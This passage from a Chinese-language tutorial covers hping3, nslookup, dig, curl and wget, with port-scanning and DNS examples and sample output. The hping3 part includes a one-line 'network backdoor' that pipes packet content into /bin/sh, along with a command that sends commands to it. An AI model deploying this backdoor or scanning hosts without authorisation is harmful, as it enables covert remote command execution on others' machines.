tcp ACK标记 -U \u0026ndash;urg 设置 tcp URG标记 -X \u0026ndash;xmas 设置 tcp Xmas标记 -Y \u0026ndash;ymas 设置 tcp Ymas标记 常用参数\n参数 说明 -d --data 设置数据包主体大小。 使用 --data 40 hping将在 protocol_header 增加40 字节。 -E --file [filename] 使用文件名内容填充数据包的数据 -j --dump 以16进制导出数据包 -J --print 导出可打印的数据包 -u --end 如果使用 ``\u0026ndash;file filename` 选项，何时为EOF。 -T --traceroute traceroute 模式。此选项将在接收ttl来尝试追踪。 --tr-keep-ttl 保持ttl的固定，用于监视某一跳 –tr-stop traceroute 下收到第一个不是ICMP时退出 \u0026hellip;. 输出格式\nhping的一个标准的TCP/UDP格式如下，UDP字段含义与TCP的相同。\n# tcp len=46 ip=192.168.1.1 flags=RA DF seq=0 ttl=255 id=0 win=0 rtt=0.4 ms # udp len=46 ip=192.168.1.1 seq=0 ttl=64 id=0 rtt=6.0 ms len：len是从数据链路层捕获的数据的大小（字节），不包括数据链路头大小。 ip： ip 为请求的ip flags：flags为TCP的标记，如 R RESET S SYN A ACK F FIN P PUSH U URGENT X 不标准的 0x40 Y 不标准的 0x80 seq：seq是数据包的序列号，使用TCP/UDP数据包的源端口获得 id 是IP ID字段。 win TCP 窗口大小 rtt 往返时间 （round trip time），单位毫秒 以下是使用-V参数后的字段 tos 是IP标头的服务类型字段。 iplen ip的总长度 seq 和 ack 是TCP标头中的序列号和32位确认号 是TCP标头校验和值。 urp TCP紧急指针值。 ICMP的输出格式\nICMP Port Unreachable from ip=192.168.1.1 name=nano.marmoc.net 在此格式中，ip 为 ICMP 错误的 IP 地址，name为解析的名称或者为UNKNOWN，而其他的参数含义与TCP/UDP大致相同。\n端口扫描 hping可以自由地创建原始IP、TCP、UDP和ICMP数据包。可以利用此功能生成 TCP SYN 扫描。TCP-SYN 扫描是最简单的将数据包发送到主机/IP端口的方法。这里 扫描的为110.242.68.4:80\n启动经典的扫描的最简单方法是将TCP-SYN数据包发送到主机/ip上的端口。下面的命令将扫描IP 192.168.8.223上的端口80。从输出中，可以看到 flags=SA SYN和ACK标记，代表一个开放端口。\nhping3 -S 110.242.68.4 -p 80 -c 2 扫描一个范围的端口可以使用 ++\nhping3 -S 110.242.68.4 -p ++80 也可以使用如下方式\nhping3 -8 80-86 -S 110.242.68.4 Scanning 110.242.68.4 (110.242.68.4), port 80-86 7 ports to scan, use -V to see all the replies +----+-----------+---------+---+-----+-----+-----+ |port| serv name | flags |ttl| id | win | len | +----+-----------+---------+---+-----+-----+-----+ 80 http : .S..A... 128 60936 64240 46 All replies received. Done. Not responding ports: (81 ) (82 xfer) (83 mit-ml-dev) (84 ctf) (85 ) (86 mfcobol) 通过Hping3跟踪路由到指定端口： hping3支持一个很实用功能，可以追踪路由到一个指出的端口，查看你的数据包被阻塞的地方。\nhping3 --traceroute -p 80 -V -1 www.google.com using eth0, addr: 195.133.11.43, MTU: 1500 HPING www.google.com (eth0 142.250.150.104): icmp mode set, 28 headers + 0 data bytes hop=1 TTL 0 during transit from ip=195.133.10.1 name=gateway hop=1 hoprtt=3.1 ms hop=2 TTL 0 during transit from ip=10.11.12.37 name=UNKNOWN hop=2 hoprtt=10.0 ms hop=3 TTL 0 during transit from ip=62.140.243.62 name=msk-m9-b1-ae30-vlan449.fiord.net hop=3 hoprtt=1.9 ms hop=4 TTL 0 during transit from ip=62.140.239.113 name=msk-m9-b6-ae1-vlan12.fiord.net hop=4 hoprtt=9.8 ms hop=5 TTL 0 during transit from ip=72.14.222.198 name=UNKNOWN hop=5 hoprtt=4.2 ms hop=6 TTL 0 during transit from ip=108.170.250.33 name=UNKNOWN hop=6 hoprtt=3.8 ms hop=7 TTL 0 during transit from ip=108.170.250.51 name=UNKNOWN hop=7 hoprtt=2.5 ms hop=8 TTL 0 during transit from ip=142.251.49.158 name=UNKNOWN hop=8 hoprtt=34.7 ms hop=9 TTL 0 during transit from ip=108.170.235.204 name=UNKNOWN hop=9 hoprtt=18.2 ms hop=10 TTL 0 during transit from ip=142.250.209.35 name=UNKNOWN hop=10 hoprtt=17.1 ms .... 不同类型的ICMP hping3 -c 5 -V -1 -C 17 110.242.68.4 using eth0, addr: 10.0.0.4, MTU: 1500 HPING 110.242.68.4 (eth0 110.242.68.4): icmp mode set, 28 headers + 0 data bytes --- 110.242.68.4 hping statistic --- 5 packets transmitted, 0 packets received, 100% packet loss round-trip min/avg/max = 0.0/0.0/0.0 ms 通过hping3进行TCP FIN扫描\n在TCP连接中，FIN标志用于开始请求关闭连接。万一没有得到答复，那说明端口是开放的。通常防火墙会再次发送Rst+ack数据包，以指示该端口已关闭。\n通过hping3 进行ACK扫描 有些情况下，主机可能禁止PING ICMP，此时使用ACK扫描可以用于检查主机是否处于活动状态。如果主机活跃，会相应RST标记，在hping中是为 flags=R。\nhping3 -c 2 -V -p 80 -A 110.242.68.4 using eth0, addr: 10.0.0.4, MTU: 1500 HPING 110.242.68.4 (eth0 110.242.68.4): A set, 40 headers + 0 data bytes len=46 ip=110.242.68.4 ttl=128 id=2391 tos=0 iplen=40 sport=80 flags=R seq=0 win=32767 rtt=0.6 ms seq=1165126080 ack=0 sum=c0ba urp=0 UDP扫描 使用参数 -2 可以让hping工作于UDP模式，可以进行UDP扫描\nhping3 -2 8.8.4.4 -V -p 53 -c 10 操作系统识别 使用-Q或-seqnum可以让hping 收集了ISN。\nhping3 127.0.0.1 -Q -p 22 -V -S using lo, addr: 127.0.0.1, MTU: 65536 HPING 127.0.0.1 (lo 127.0.0.1): S set, 40 headers + 0 data bytes 893247485 +893247485 2568100167 +1674852682 2600543427 +32443260 内容探测 可以使用hping的监听模式，来抓取通过网络接口的所有流量，以及捕获对应的内容。例如抓取通过谷歌搜索的流量包\nhping3 -9 \u0026quot;www.google.com\u0026quot; --beep -I eth0hping2 listen mode[main] memlockall(): SuccessWarning: can't disable memory paging!Accept: */*.hk/url?sa=p\u0026amp;hl=zh-CN\u0026amp;pref=hkredirect\u0026amp;pval=yes\u0026amp;q=http://www.google.com.hk/\u0026amp;ust=1624605433464983\u0026amp;usg=AOvVaw2THxd5w15lxgX3_KA19GWLCache-Control: privateContent-Type: text/html; charset=UTF-8P3P: CP=\u0026quot;This is not a P3P policy! See g.co/p3phelp for more info.\u0026quot;Date: Fri, 25 Jun 2021 07:16:43 GMTServer: gwsContent-Length: 370X-XSS-Protection: 0X-Frame-Options: SAMEORIGINSet-Cookie: 1P_JAR=2021-06-25-07; expires=Sun, 25-Jul-2021 07:16:43 GMT; path=/; domain=.google.com; SecureSet-Cookie: NID=217=PdQLBtU-tTavgvb4BW9ouB3nAr1OKNK6I_kn9u2Qa2eTgLA_qLyGv2G_2t2G_PRNVrKu2SOEm-e7ED17ljnx3uFBweBjQWOyRvHrJ6jhC5_J3yaBK0r8mikUrqHNjDez5F3rCleFQDurBEfnqECDFXNkvvO_-Wn4ahGJeid01TM; expires=Sat, 25-Dec-2021 07:16:43 GMT; path=/; domain=.google.com; HttpOnly\u0026lt;HTML\u0026gt;\u0026lt;HEAD\u0026gt;\u0026lt;meta http-equiv=\u0026quot;content-type\u0026quot; content=\u0026quot;text/html;charset=utf-8\u0026quot;\u0026gt;\u0026lt;TITLE\u0026gt;302 Moved\u0026lt;/TITLE\u0026gt;\u0026lt;/HEAD\u0026gt;\u0026lt;BODY\u0026gt;\u0026lt;H1\u0026gt;302 Moved\u0026lt;/H1\u0026gt;The document has moved\u0026lt;A HREF=\u0026quot;http://www.google.com.hk/url?sa=p\u0026amp;amp;hl=zh-CN\u0026amp;amp;pref=hkredirect\u0026amp;amp;pval=yes\u0026amp;amp;q=http://www.google.com.hk/\u0026amp;amp;ust=1624605433464983\u0026amp;amp;usg=AOvVaw2THxd5w15lxgX3_KA19GWL\u0026quot;\u0026gt;here\u0026lt;/A\u0026gt;.\u0026lt;/BODY\u0026gt;\u0026lt;/HTML\u0026gt;.hk/\u0026amp;ust=1624605433464983\u0026amp;usg=AOvVaw2THxd5w15lxgX3_KA19GWL HTTP/1.1User-Agent: curl/7.29.0Host: www.google.com.hkAccept: */*.hk/Cache-Control: privateContent-Type: text/html; charset=UTF-8P3P: CP=\u0026quot;This is not a P3P policy! See g.co/p3phelp for more info.\u0026quot;Date: Fri, 25 Jun 2021 07:16:43 GMTServer: gwsContent-Length: 222X-XSS-Protection: 0Set-Cookie: 1P_JAR=2021-06-25-07; e 网络后门 可以通过hping3的监听模式，创建一个简单的后门(backdoor)，通过管道来执行脚本\nhping3 -I eth1 -9 secret | /bin/shhping3 -R 192.168.1.100 -e secret -E commands_file -d 100 -c 1 nslookup nslookup（name server lookup）用于在Linux中执行DNS查找的工具。用于显示DNS详细信息，例如计算机的IP地址、域的MX记录或域的NS服务器。\nnslookup 可以在两种模式下运行：交互式和非交互式。交互模式可以查询名称服务器以获取有关各种主机和域的信息或打印域中的主机列表。非交互模式仅打印主机或域的名称和请求的信息。\n各系统下的安装\nUbuntu/Debian: knot-dnsutils ；apt install knot-dnsutils CentOS/Fedora: bind-utils | dnsutils ；yum install -y bind-utils Apline：bind-tools ；apk add bind-tools 简单查询 nslookup后跟域名将显示域名的“A记录”（IP地址）,nslookup命令的默认输出比dig命令的默认输出相对整洁些。\nnslookup redhat.com 执行反向DNS查找：\nnslookup 208.117.229.88 查询MX记录 MX（ Mail Exchange ）记录将域名映射到该域的邮件服务器列表。MX记录表明发到 @qq.com 的所有邮件都应该路由到该域中的邮件服务器。\nnslookup -query=mx qq.com Server: 183.60.83.19 Address: 183.60.83.19#53 Non-authoritative answer: qq.com mail exchanger = 20 mx2.qq.com. qq.com mail exchanger = 30 mx1.qq.com. qq.com mail exchanger = 10 mx3.qq.com. Authoritative answers can be found from: Authoritative Answer与Non-Authoritative Answer\n可以注意到注意到上面输出中的关键字 Authoritative 和 Non-Authoritative Answer。任何来自DNS服务器的答复都称为Authoritative Answer，该服务器具有域可用的完整区域文件信息。在许多情况下，DNS服务器将不具备给定域的完整区域文件信息。相反，它维护一个缓存文件，该文件包含过去执行的所有查询的结果，并已获得权威响应。当给出一个DNS查询时，它搜索缓存文件，并以 Non-Authoritative Answer 的形式返回可用的信息。\n查询NS记录 NS ( Name Server ) 记录将域名映射到该域的授权DNS服务器列表。它将输出与给定域关联的名称服务。\nnslookup -type=ns qq.comServer: 183.60.83.19Address: 183.60.83.19#53Non-authoritative answer:qq.com nameserver = ns1.qq.com.qq.com nameserver = ns2.qq.com.qq.com nameserver = ns3.qq.com.qq.com nameserver = ns4.qq.com.Authoritative answers can be found from: 查询SOA记录 SOA ( start of authority )记录\\，提供关于域的权威信息、域管理员的电子邮件地址、域序列号等。\nnslookup -type=soa qq.com Server: 183.60.83.19 Address: 183.60.83.19#53 Non-authoritative answer: qq.com origin = ns1.qq.com mail addr = webmaster.qq.com serial = 1330914143 refresh = 3600 retry = 300 expire = 86400 minimum = 300 Authoritative answers can be found from: mail addr–指定域管理员的邮件地址 serial 一种版本编号系统。标准惯例是使用 YYYYMMYNN 格式 2012-07-16.01如果在同一天进行了多个编辑，则将递增） refresh 指定从DNS服务何时轮询主DNS以查看序列号是否已增加（以秒为单位）。如果增加，从DNS服务器将发出复制新区域文件的新请求。 retry 指定与主DNS重新连接的间隔 expire 指定辅助DNS保持缓存区域文件有效的时间 minimum 指定从DNS应缓存区域文件的时间 查看可用的DNS记录 nslookup -type=any qq.com Server: 183.60.83.19 Address: 183.60.83.19#53 Non-authoritative answer: Name: qq.com Address: 61.129.7.47 Name: qq.com Address: 183.3.226.35 Name: qq.com Address: 203.205.254.157 Name: qq.com Address: 123.151.137.18 qq.com mail exchanger = 10 mx3.qq.com. qq.com mail exchanger = 20 mx2.qq.com. qq.com mail exchanger = 30 mx1.qq.com. Authoritative answers can be found from: 使用指定DNS查询 可以指定特定的DNS来解析域名，而不是使用默认DNS进行查询。\nnslookup www.qq.com 8.8.8.8 Server: 8.8.8.8 Address: 8.8.8.8#53 Non-authoritative answer: www.qq.com canonical name = news.qq.com.edgekey.net. news.qq.com.edgekey.net canonical name = e6156.dscf.akamaiedge.net. Name: e6156.dscf.akamaiedge.net Address: 23.219.132.75 Name: e6156.dscf.akamaiedge.net Address: 2600:1417:76:494::180c Name: e6156.dscf.akamaiedge.net Address: 2600:1417:76:480::180c 使用特殊的dns端口 默认情况下，DNS使用端口号为53。可以使用-port选项指定端口号。\nnslookup -port 56 qq.com 设置超时时间 可以使用 -timeout 选项来指定超时时间\nnslookup -timeout=10 qq.com 启用调试模式 -debug 选项打开/关闭调试\nnslookup -debug qq.com Server: 183.60.83.19 Address: 183.60.83.19#53 ------------ QUESTIONS: qq.com, type = A, class = IN ANSWERS: -\u0026gt; qq.com internet address = 183.3.226.35 ttl = 92 -\u0026gt; qq.com internet address = 203.205.254.157 ttl = 92 -\u0026gt; qq.com internet address = 61.129.7.47 ttl = 92 -\u0026gt; qq.com internet address = 123.151.137.18 ttl = 92 AUTHORITY RECORDS: ADDITIONAL RECORDS: ------------ Non-authoritative answer: Name: qq.com Address: 183.3.226.35 Name: qq.com Address: 203.205.254.157 Name: qq.com Address: 61.129.7.47 Name: qq.com Address: 123.151.137.18 ------------ QUESTIONS: qq.com, type = AAAA, class = IN ANSWERS: AUTHORITY RECORDS: -\u0026gt; qq.com origin = ns1.qq.com mail addr = webmaster.qq.com serial = 1330914143 refresh = 3600 retry = 300 expire = 86400 minimum = 300 ttl = 296 ADDITIONAL RECORDS: ------------ dig dig（Domain Information Groper) 执行DNS查找。默认情况下，dig查询通过 resolver ( /etc/resolv.conf ) 中列出的DNS地址，除非指定特定的name server。\n语法 dig @server name type 解析IP地址 dig 通常不带参数地用于获取提供的DNS名称的IP地址。默认使用系统提供的DNS服务器用于DNS解析。\ndig www.qq.com ; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.11.4-P2-RedHat-9.11.4-26.P2.el7_9.3 \u0026lt;\u0026lt;\u0026gt;\u0026gt; www.qq.com ;; global options: +cmd ;; Got answer: ;; -\u0026gt;\u0026gt;HEADER\u0026lt;\u0026lt;- opcode: QUERY, status: NOERROR, id: 40004 ;; flags: qr rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 0 ;; QUESTION SECTION: ;www.qq.com. IN A ;; ANSWER SECTION: www.qq.com. 132 IN CNAME ins-r23tsuuf.ias.tencent-cloud.net. ins-r23tsuuf.ias.tencent-cloud.net. 60 IN A 109.244.236.76 ins-r23tsuuf.ias.tencent-cloud.net. 60 IN A 109.244.236.65 ;; Query time: 11 msec ;; SERVER: 183.60.83.19#53(183.60.83.19) ;; WHEN: Tue Jun 22 21:39:33 CST 2021 ;; MSG SIZE rcvd: 108 dig命令输出包括以下部分：\nHEADER：显示dig命令的版本号、dig命令使用的全局选项，以及一些附加的Header信息。 QUESTION SECTION：显示dig像DNSserver发出的请求。即你请求的域名。这里使用dig命令获取qq.com使用的默认类型（A记录） ANSWER SECTION：显示从DNS接收到的应答。将显示qq.com 的A记录 ADDITIONAL SECTION：显示ADDITIONAL SECTION 中列出的DNS服务器的ip地址。 底部的Stats部分显示一些dig命令统计信息，包括执行此查询所用的时间 仅显示应答部分 在大多数情况下，我们只需要查看dig的 ANSWER SECTION。可以仅打印该部分。\n+nocomments 不显示注释行 +noauthority 不显示authority部分 +noadditional 不显示 additional 部分 +nostats 不显示统计信息 stats +noanswer 关掉ANSWER 部分，这里一般为想要的结果 dig www.qq.com \\ +nocomments \\ +noquestion \\ +noauthority \\ +noadditional \\ +nostats ; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.11.4-P2-RedHat-9.11.4-26.P2.el7_9.3 \u0026lt;\u0026lt;\u0026gt;\u0026gt; www.qq.com +nocomments +noquestion +noauthority +noadditional +nostats ;; global options: +cmd www.qq.com. 180 IN CNAME ins-r23tsuuf.ias.tencent-cloud.net. ins-r23tsuuf.ias.tencent-cloud.net. 31 IN A 109.244.236.65 ins-r23tsuuf.ias.tencent-cloud.net. 31 IN A 109.244.236.76 也可以使用 +noal 禁用所有不需要的部分，当然也会关掉 answer ，然后+answer 只显示 answer部分，这样看起来简洁些。\ndig www.qq.com \\ +noall \\ +answer 查询MX记录 将MX作为参数，可以查询mx记录，可以使用 -t 增加类型\ndig qq.com MX +noall +answer ; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.11.4-P2-RedHat-9.11.4-26.P2.el7_9.3 \u0026lt;\u0026lt;\u0026gt;\u0026gt; qq.com MX +noall +answer ;; global options: +cmd qq.com. 4969 IN MX 10 mx3.qq.com. qq.com. 4969 IN MX 20 mx2.qq.com. qq.com. 4969 IN MX 30 mx1.qq.com. 查询NS记录 dig qq.com NS +noall +answer 查询所有记录 查看所有记录类型（A、MX、NS等），可以使用ANY作为类型。\ndig qq.com ANY +noall +answer ; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.11.4-P2-RedHat-9.11.4-26.P2.el7_9.3 \u0026lt;\u0026lt;\u0026gt;\u0026gt; qq.com ANY +noall +answer ;; global options: +cmd qq.com. 83 IN A 183.3.226.35 qq.com. 83 IN A 203.205.254.157 qq.com. 83 IN A 123.151.137.18 qq.com. 83 IN A 61.129.7.47 仅查看记录的IP 有些场景下，仅需要域名的ip地址（即a记录），可以使用 +short 选项。\ndig qq.com +short 123.151.137.18 203.205.254.157 183.3.226.35 61.129.7.47 +short 也可指定类型\ndig qq.com a +short 111.30.144.71 112.53.26.232 dig qq.com mx +short 10 mx3.qq.com. 20 mx2.qq.com. 30 mx1.qq.com. 反向查找 可以使用dig-x 进行ip地址反向查找DNS，场景：如果只有一个外部ip地址，并且希望知道属于它的网站时。当然过了CDN的域名，只会显示对应CNAME\ndig -x 203.205.254.157 +short 使用指定DNS来进行查询 默认情况下，dig 使用 /etc/resolv.conf 文件中定义的DNS。如果要使用其他DNS执行查询，使用 @dnsserver。\ndig @8.8.8.8 www.qq.com +short ins-r23tsuuf.ias.tencent-cloud.net. 109.244.236.76 109.244.236.65 批量查询 进行批量查询时可以不用通过shell循环查询了，dig提供了批量查询的功能。使用dig -f 从文件内进行批量DNS查询。\necho www.qq.com \u0026gt; dns.txt echo www.baidu.com \u0026gt;\u0026gt; dns.txt dig -f dns.txt +noall +answer www.baidu.com. 678 IN CNAME www.a.shifen.com. www.a.shifen.com. 106 IN A 14.215.177.39 www.a.shifen.com. 106 IN A 14.215.177.38 www.qq.com. 60 IN CNAME ins-r23tsuuf.ias.tencent-cloud.net. ins-r23tsuuf.ias.tencent-cloud.net. 60 IN A 109.244.236.65 ins-r23tsuuf.ias.tencent-cloud.net. 60 IN A 109.244.236.76 也可以在命令行直接根多个域名即可，这样查询结果相比于shell循环查询会简洁很多。\ndig qq.com mx +noall +answer baidu.org ns +noall +answer ; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.11.4-P2-RedHat-9.11.4-26.P2.el7_9.3 \u0026lt;\u0026lt;\u0026gt;\u0026gt; qq.com mx +noall +answer baidu.org ns +noall +answer ;; global options: +cmd qq.com. 4223 IN MX 10 mx3.qq.com. qq.com. 4223 IN MX 20 mx2.qq.com. qq.com. 4223 IN MX 30 mx1.qq.com. baidu.org. 300 IN NS ns4.brandshelter.net. baidu.org. 300 IN NS ns3.brandshelter.info. baidu.org. 300 IN NS ns2.brandshelter.de. baidu.org. 300 IN NS ns5.brandshelter.us. baidu.org. 300 IN NS ns1.brandshelter.com. 设置dig默认选项 如别名 alias 一样，在查询中不想输入过多的 +noall +answer 之类，可以在 $HOME/.digrc 设置dig 的默认参数，这样只需和平时一样使用 dig domain 即可。\ncat \u0026lt;\u0026lt;EOF \u0026gt;${HOME}/.digrc+noall +answerEOFdig www.qq.comwww.qq.com. 247 IN CNAME ins-r23tsuuf.ias.tencent-cloud.net.ins-r23tsuuf.ias.tencent-cloud.net. 67 IN A 109.244.236.76ins-r23tsuuf.ias.tencent-cloud.net. 67 IN A 109.244.236.6 curl curl 是Linux命令行工具，可以使用任何可支持的协议（如HTTP、FTP、IMAP、POP3、SCP、SFTP、SMTP、TFTP、TELNET、LDAP或FILE）在服务器之间传输数据。\n在Linux下，curl是由 libcurl 提供驱动封装的cli客户端，在 libcurl 驱动下，curl可以一次传输多个文件。而PHP中的cURL函数，也是基于libcurl驱动的。\n各系统下的安装\nUbuntu/Debian: curl； apt install curl CentOS/Fedora: curl ； yum install -y curl Apline：curl | wget ； apk add --no-cache curl cURL常用参数 参数 说明 -i 默认隐藏响应头，此选项打印响应头与 -I/\u0026ndash;head 仅显示响应头 -o 将相应内容保存指定路径下 -O 将相应内容保存在当前工作目录下 -C 断点续传，在 crtl + c终端后，可以从中断后部分开始 -v 显示请求头与响应头 -x 使用代理 -X 指定请求方法，POST GET PUT DELETE等 -d 如GET/POST/PUT/DELETE 需要传的表单参数，如JSON格式 -u username:password 当使用ftp有用户名可以使用-u，ftp允许匿名用户访问可以忽略 –-limit-rate 2000B 限速 -T/\u0026ndash;upload-file \u0026lt;file\u0026gt; 上传一个文件 -c/\u0026ndash;cookie-jar \u0026lt;file name\u0026gt; 将cookie下载到文件内 -k/\u0026ndash;insecure 允许执行不安全的ssl连接，即调过SSL检测 --header 'Host: targetapplication.com' 使用请求头 -L/\u0026ndash;location 接受服务端redirect的请求 -F 上传二进制文件 限制下载速率 curl --limit-rate 100K http://yourdomain.com/yourfile.tar.gz -O 使用代理访问 curl --proxy yourproxy:port https://yoururl.com 限速访问 curl www.baidu.com --limit-rate 1k 存储cookie和使用cookie $ curl --cookie-jar cnncookies.txt https://www.baidu.com/index.html -O -s -v * About to connect() to www.baidu.com port 443 (#0) * Trying 14.215.177.39... * Connected to www.baidu.com (14.215.177.39) port 443 (#0) * Initializing NSS with certpath: sql:/etc/pki/nssdb * CAfile: /etc/pki/tls/certs/ca-bundle.crt CApath: none * SSL connection using TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 * Server certificate: * subject: CN=baidu.com,O=\u0026quot;Beijing Baidu Netcom Science Technology Co., Ltd\u0026quot;,OU=service operation department,L=beijing,ST=beijing,C=CN * start date: Apr 02 07:04:58 2020 GMT * expire date: Jul 26 05:31:02 2021 GMT * common name: baidu.com * issuer: CN=GlobalSign Organization Validation CA - SHA256 - G2,O=GlobalSign nv-sa,C=BE \u0026gt; GET /index.html HTTP/1.1 \u0026gt; User-Agent: curl/7.29.0 \u0026gt; Host: www.baidu.com \u0026gt; Accept: */* \u0026gt; \u0026lt; HTTP/1.1 200 OK \u0026lt; Accept-Ranges: bytes \u0026lt; Cache-Control: private, no-cache, no-store, proxy-revalidate, no-transform \u0026lt; Connection: keep-alive \u0026lt; Content-Length: 2443 \u0026lt; Content-Type: text/html \u0026lt; Date: Wed, 26 May 2021 12:14:41 GMT \u0026lt; Etag: \u0026quot;58860402-98b\u0026quot; \u0026lt; Last-Modified: Mon, 23 Jan 2017 13:24:18 GMT \u0026lt; Pragma: no-cache \u0026lt; Server: bfe/1.0.8.18 * Added cookie BDORZ=\u0026quot;27315\u0026quot; for domain baidu.com, path /, expire 1622117681 \u0026lt; Set-Cookie: BDORZ=27315; max-age=86400; domain=.baidu.com; path=/ \u0026lt; { [data not shown] * Connection #0 to host www.baidu.com left intact # Netscape HTTP Cookie File# http://curl.haxx.se/docs/http-cookies.html# This file was generated by libcurl! Edit at your own risk..baidu.com TRUE / FALSE 1622117681 BDORZ 27315 $ curl --cookie cnncookies.txt https://www.baidu.com -s -v -o /dev/null * About to connect() to www.baidu.com port 443 (#0) * Trying 14.215.177.39... * Connected to www.baidu.com (14.215.177.39) port 443 (#0) * Initializing NSS with certpath: sql:/etc/pki/nssdb * CAfile: /etc/pki/tls/certs/ca-bundle.crt CApath: none * SSL connection using TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 * Server certificate: * subject: CN=baidu.com,O=\u0026quot;Beijing Baidu Netcom Science Technology Co., Ltd\u0026quot;,OU=service operation department,L=beijing,ST=beijing,C=CN * start date: Apr 02 07:04:58 2020 GMT * expire date: Jul 26 05:31:02 2021 GMT * common name: baidu.com * issuer: CN=GlobalSign Organization Validation CA - SHA256 - G2,O=GlobalSign nv-sa,C=BE \u0026gt; GET / HTTP/1.1 \u0026gt; User-Agent: curl/7.29.0 \u0026gt; Host: www.baidu.com \u0026gt; Accept: */* \u0026gt; Cookie: BDORZ=27315 \u0026gt; \u0026lt; HTTP/1.1 200 OK \u0026lt; Accept-Ranges: bytes \u0026lt; Cache-Control: private, no-cache, no-store, proxy-revalidate, no-transform \u0026lt; Connection: keep-alive \u0026lt; Content-Length: 2443 \u0026lt; Content-Type: text/html \u0026lt; Date: Wed, 26 May 2021 12:23:27 GMT \u0026lt; Etag: \u0026quot;58860402-98b\u0026quot; \u0026lt; Last-Modified: Mon, 23 Jan 2017 13:24:18 GMT \u0026lt; Pragma: no-cache \u0026lt; Server: bfe/1.0.8.18 * Replaced cookie BDORZ=\u0026quot;27315\u0026quot; for domain baidu.com, path /, expire 1622118207 \u0026lt; Set-Cookie: BDORZ=27315; max-age=86400; domain=.baidu.com; path=/ # 这里可以看到设置的cookie \u0026lt; { [data not shown] * Connection #0 to host www.baidu.com left intact 使用代理 curl -x socks5://127.0.0.1:10808 https://www.google.com 使用application/x-www-form-urlencoded表单类型 这里使用的为application/x-www-form-urlencoded\ncurl -d \u0026quot;option=value\u0026amp;something=anothervalue\u0026quot; -X POST https://{hostname}/ 使用json格式作为body curl -H \u0026quot;Content-Type: application/json\u0026quot; -X POST https://host.com/ \\ -d ' { \u0026quot;option\u0026quot;: \u0026quot;value\u0026quot;, \u0026quot;something\u0026quot;: \u0026quot;anothervalue\u0026quot; }' 使用curl 上传文件 curl {host}/api/v1/upimg -F \u0026quot;file=@/Users/fungleo/Downloads/401.png\u0026quot; \\ -H \u0026quot;token: 222\u0026quot; -v 也可以指定MIME类型。如：\ncurl -F 'file=@photo.png;type=image/png' https://{host}/api/v1/upimg curl输出的格式变量 curl -w参数提供了一些格式变量，可以达到紧紧获取某些数据\n仅获取http状态码 curl -w %{http_code} www.baidu.com -o /dev/null -s 获取整个请求的时间 获取整个请求的耗时，单位秒，显示单位 毫秒\ncurl -w %{time_total} www.baidu.com -o /dev/null -s 获取域名解析时间 curl -w %{time_namelookup} www.baidu.com -o /dev/null -s 获取TCP连接耗时 curl -w %{time_connect} www.baidu.com -o /dev/null -s 获取SSL/SSH握手到远程主机耗时 curl -w %{time_appconnect} https://www.baidu.com -o /dev/null -s -v 获取所有重定向的耗时 这里是从查找、连接、传输整个事务的完成到开始传送数据之前的耗时\ncurl -w %{time_redirect} www.baidu.com -o /dev/null -s 获得下载的总字节数 这里是http相应的body长度，而不是加上头部的大小\ncurl -w %{size_download} www.baidu.com -o /dev/null -s $ curl -w %{size_download} www.baidu.com -o /dev/null -s 2381 获得请求体送字节数 curl -w %{size_request} www.baidu.com -o /dev/null -s 获得传输中的连接数 curl -w %{num_connects} www.baidu.com -o /dev/null -s 获得重定向次数 curl -w %{num_redirects} www.360buy.com -o /dev/null -s -L 获得SSL验证结果 0 表示是成功的\ncurl -w %{ssl_verify_result} https://www.baidu.com -o /dev/null -s -L 获得重定向的地址 当没有指定-L时，会返回被重定向后的地址\ncurl -w %{redirect_url} https://www.360buy.com -o /dev/null -s 获得上传和下载速度 curl -w %{speed_download} https://www.360buy.com -o /dev/null -s curl -w %{speed_upload} https://www.360buy.com -o /dev/null -s 根据自己需要拼接特定格式 curl -w \u0026quot;总共请求时长：%{time_total}\\n总跳转次数：%{num_redirects}\\n\u0026quot; \\ www.360buy.com -o /dev/null -s 总共请求时长：1.338总跳转次数：3 wget wget 用于从web下载文件的命令行程序。wget，可以使用 HTTP、HTTPS和 FTP 协议下载文件。wget还允许下载多个文件、断点续传、限速、递归下载、后台下载、镜像网站等等。\n各系统下的安装\nUbuntu/Debian: wget ； apt install wget CentOS/Fedora: wget ； yum install -y wget Apline： wget ； apk add --no-cache wget 简单使用 使用wget最简单的方法是为它提供通过HTTP下载的文件的位置。如，下载文件。\nwget http://website.com/files/file.zip 该操作会将文件下载到工作目录中。\n下载文件并保存为指定名称 wget –O [file_name] [URL] 将文件下载到指定目录 默认情况下，wget下载的文件保存在用户所在工作目录中。使用 –P 可以将文件保存到指定路径。\nwget –P [wanted_directory] [URL] 设置下载速度 在下载时可以设置下载时最大使用带宽，这样就不会使用主机全部的可用带宽。下载速度以 k 和 m 定义单位。\nwget --limit-rate [wanted_speed] [URL] wget --limit-rate 1m http://us.download.nvidia.com/tesla/396.37/nvidia-diag-driver-local-repo-ubuntu1710-396.37_1.0-1_amd64.deb 断点续传 如果在下载时取消，wget提供了可以在中断前停止的地方继续下载。当下载文件时连接丢失时，这个非常有用。\nwget –c [URL] 下载多个文件 wget也提供了下载多个文件的方法：\n方法1：将需要下载的文件地址保存在文件中 使用 -i 指定文件，每个URL 单独占一行\nwget –i [file_name] 下载网页（网站镜像） 使用 –m 下载URL中包含的所有连接，结果会保存为一个文件夹\nwget –m [URL] FTP下载 wget也可以下载FTP文件，当需要认证时，可以指定FTP的用户名和密码，然后接FTP地址：\nwget --ftp-user=[ftp_username] --ftp-password=[ftp_password] ftp://... 后台下载 当下载文件很大时，wget也支持后台下载文件，在网络不稳定命令行断开时很实用。\nwget –b [URL] 可以使用命令 tail –f wget –log 来检查下载状态\n中断重试次数 当网络中断后，wget也支持设置在网络中断后尝试下载文件的次数：\nwget --tries=[number_of_tries] [URL] 忽略证书验证 默认情况下，wget会验证服务端SSL/TLS证书是否有效。如果识别到无效的证书，它将拒绝下载。当在访问自签名证书时，可以使用--no-check-certificate 忽略验证\nwget --no-check-certificate [URL] 自定义User-Agent 当服务端阻止了特定的 User-Agent 时，可以进行自定义 User-Agent 设置。\nwget --user-agent=”User Agent Here” “[URL]” 